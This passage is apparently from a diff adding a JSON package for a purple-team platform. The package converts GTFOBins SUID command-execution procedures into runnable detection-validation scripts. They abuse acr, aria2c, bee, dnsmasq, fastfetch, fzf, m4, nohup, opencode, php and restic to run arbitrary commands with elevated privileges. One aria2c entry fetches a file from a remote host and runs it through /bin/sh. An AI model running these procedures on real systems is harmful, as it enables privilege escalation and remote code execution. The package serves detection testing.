@@ -1,0 +1,1084 @@
+{
+  "package_id": "gtfobins-command-suid-v1",
+  "package_name": "GTFOBins - Command / Suid",
+  "version": "1.0.0",
+  "summary": "19 source-derived GTFOBins Living-Off-The-Land procedures for command / Suid.",
+  "description": "Faithful, deterministic conversion of explicit GTFOBins procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 19 distinct source procedures grouped by command / Suid.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Linux/Unix binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "GTFOBins / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "GTFOBINS - ",
+  "provider": "gtfobins",
+  "source": "gtfobins",
+  "source_repository": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "source_commit": "acd524623f9c406acedd2754ebd9c2431f3675ad",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Command",
+  "mitre_tcodes": [
+    "T1059"
+  ],
+  "platform": [
+    "linux"
+  ],
+  "risk_badges": [
+    "modify"
+  ],
+  "readiness_counts": {
+    "environment_prerequisite": 19
+  },
+  "category": "lotl/gtfobins",
+  "tag_categories": [
+    {
+      "category_id": "lotl_gtfobins_parameters",
+      "label": "GTFOBins Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_gtfobins_local_path",
+          "label": "Local Path",
+          "description": "Operator-supplied local path for this authorized LOTL procedure. Source token: /path/to/temp-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "local_path"
+        },
+        {
+          "key": "lotl_gtfobins_remote_host",
+          "label": "Remote Host",
+          "description": "Operator-supplied remote host for this authorized LOTL procedure. Source token: literal network target.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        },
+        {
+          "key": "lotl_gtfobins_remote_port",
+          "label": "Remote Port",
+          "description": "Operator-supplied remote port for this authorized LOTL procedure. Source token: \\b12345\\b.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "connection"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "gtfobins:acr:command:0:suid::",
+      "name": "GTFOBINS - T1059 - acr - Command - Suid [35aed30]",
+      "description": "This executable can run non-interactive system commands. Binary: acr. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >#{lotl_gtfobins_local_path}\nchmod +x #{lotl_gtfobins_local_path}\nacr -r ./relative#{lotl_gtfobins_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/acr",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/acr",
+        "source_bin": "acr",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:acr:command:0:suid::",
+        "source_name": "acr",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `acr` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:aria2c:command:1:suid::",
+      "name": "GTFOBINS - T1059 - aria2c - Command - Suid [b1b476f]",
+      "description": "This executable can run non-interactive system commands. Binary: aria2c. Context: SUID. The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://#{lotl_gtfobins_remote_host}/aaaaaaaaaaaaaaaa",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/aria2c",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/aria2c",
+        "source_bin": "aria2c",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:aria2c:command:1:suid::",
+        "source_name": "aria2c",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `aria2c` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:aria2c:command:0:suid::",
+      "name": "GTFOBINS - T1059 - aria2c - Command - Suid [df3fad2]",
+      "description": "This executable can run non-interactive system commands. Binary: aria2c. Context: SUID. Note that the subprocess is immediately sent to the background.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo /path/to/command >#{lotl_gtfobins_local_path}\nchmod +x #{lotl_gtfobins_local_path}\naria2c --on-download-error=#{lotl_gtfobins_local_path} http://#{lotl_gtfobins_remote_host}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_remote_host"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/aria2c",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/aria2c",
+        "source_bin": "aria2c",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:aria2c:command:0:suid::",
+        "source_name": "aria2c",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `aria2c` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bee:command:2:suid:0:bee>php",
+      "name": "GTFOBINS - T1059 - bee - Command - Suid [1277b06]",
+      "description": "This executable can run non-interactive system commands. Binary: bee. Context: SUID. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option. Inherits command behavior from php.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bee eval '...'\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"/path/to/command\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bee",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bee",
+        "source_bin": "bee",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 2,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "php",
+        "inheritance_path": [
+          "bee",
+          "php"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "inherited_from": "php",
+          "inheritance_path": [
+            "bee",
+            "php"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bee:command:2:suid:0:bee>php",
+        "source_name": "bee",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `bee` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bee:command:1:suid:0:bee>php",
+      "name": "GTFOBINS - T1059 - bee - Command - Suid [3e3197c]",
+      "description": "This executable can run non-interactive system commands. Binary: bee. Context: SUID. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option. Inherits command behavior from php.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bee eval '...'\nphp -r '$r=array(); exec(\"/path/to/command\", $r); print(join(\"\\n\",$r));'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bee",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bee",
+        "source_bin": "bee",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "php",
+        "inheritance_path": [
+          "bee",
+          "php"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "inherited_from": "php",
+          "inheritance_path": [
+            "bee",
+            "php"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bee:command:1:suid:0:bee>php",
+        "source_name": "bee",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `bee` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bee:command:0:suid:0:bee>php",
+      "name": "GTFOBINS - T1059 - bee - Command - Suid [0d6ec39]",
+      "description": "This executable can run non-interactive system commands. Binary: bee. Context: SUID. This allows to run PHP code (`...`). This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option. Inherits command behavior from php.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bee eval '...'\nphp -r 'echo shell_exec(\"/path/to/command\");'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bee",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bee",
+        "source_bin": "bee",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "php",
+        "inheritance_path": [
+          "bee",
+          "php"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "inherited_from": "php",
+          "inheritance_path": [
+            "bee",
+            "php"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bee:command:0:suid:0:bee>php",
+        "source_name": "bee",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `bee` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:dnsmasq:command:0:suid::",
+      "name": "GTFOBINS - T1059 - dnsmasq - Command - Suid [5a2c207]",
+      "description": "This executable can run non-interactive system commands. Binary: dnsmasq. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "dnsmasq --conf-script='/path/to/command 1>&2'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/dnsmasq",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/dnsmasq",
+        "source_bin": "dnsmasq",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:dnsmasq:command:0:suid::",
+        "source_name": "dnsmasq",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `dnsmasq` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:fastfetch:command:0:suid::",
+      "name": "GTFOBINS - T1059 - fastfetch - Command - Suid [13ae45c]",
+      "description": "This executable can run non-interactive system commands. Binary: fastfetch. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /path/to/command\"}]}' >#{lotl_gtfobins_local_path}.jsonc\nfastfetch -c #{lotl_gtfobins_local_path}.jsonc",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/fastfetch",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/fastfetch",
+        "source_bin": "fastfetch",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:fastfetch:command:0:suid::",
+        "source_name": "fastfetch",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `fastfetch` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:fzf:command:0:suid::",
+      "name": "GTFOBINS - T1059 - fzf - Command - Suid [60aaf70]",
+      "description": "This executable can run non-interactive system commands. Binary: fzf. Context: SUID. Commands can be issued via POST requests, for example: ``` curl http://localhost:12345 -d 'execute(/path/to/command)' ```",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "fzf --listen=#{lotl_gtfobins_remote_port}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/fzf",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/fzf",
+        "source_bin": "fzf",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:fzf:command:0:suid::",
+        "source_name": "fzf",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `fzf` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:m4:command:0:suid::",
+      "name": "GTFOBINS - T1059 - m4 - Command - Suid [6535340]",
+      "description": "This executable can run non-interactive system commands. Binary: m4. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo 'esyscmd(/path/to/command)' | m4",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/m4",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/m4",
+        "source_bin": "m4",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:m4:command:0:suid::",
+        "source_name": "m4",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `m4` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nohup:command:0:suid::",
+      "name": "GTFOBINS - T1059 - nohup - Command - Suid [d658a8d]",
+      "description": "This executable can run non-interactive system commands. Binary: nohup. Context: SUID. The `nohup.out` file contains the standard output and error of the command.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "nohup /path/to/command\ncat nohup.out",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nohup",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nohup",
+        "source_bin": "nohup",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nohup:command:0:suid::",
+        "source_name": "nohup",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `nohup` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:opencode:command:0:suid::",
+      "name": "GTFOBINS - T1059 - opencode - Command - Suid [b5d5109]",
+      "description": "This executable can run non-interactive system commands. Binary: opencode. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "opencode\n! /path/to/command",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/opencode",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/opencode",
+        "source_bin": "opencode",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:opencode:command:0:suid::",
+        "source_name": "opencode",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `opencode` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:php:command:2:suid::",
+      "name": "GTFOBINS - T1059 - php - Command - Suid [03cbdaf]",
+      "description": "This executable can run non-interactive system commands. Binary: php. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "php -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"/path/to/command\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/php",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/php",
+        "source_bin": "php",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 2,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:php:command:2:suid::",
+        "source_name": "php",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `php` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:php:command:1:suid::",
+      "name": "GTFOBINS - T1059 - php - Command - Suid [cb57421]",
+      "description": "This executable can run non-interactive system commands. Binary: php. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "php -r '$r=array(); exec(\"/path/to/command\", $r); print(join(\"\\n\",$r));'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/php",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/php",
+        "source_bin": "php",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:php:command:1:suid::",
+        "source_name": "php",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `php` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:php:command:0:suid::",
+      "name": "GTFOBINS - T1059 - php - Command - Suid [84e57b9]",
+      "description": "This executable can run non-interactive system commands. Binary: php. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "php -r 'echo shell_exec(\"/path/to/command\");'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/php",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/php",
+        "source_bin": "php",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:php:command:0:suid::",
+        "source_name": "php",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `php` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:restic:command:1:suid::",
+      "name": "GTFOBINS - T1059 - restic - Command - Suid [7148bda]",
+      "description": "This executable can run non-interactive system commands. Binary: restic. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "restic --password-command='/path/to/command' backup",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/restic",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/restic",
+        "source_bin": "restic",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
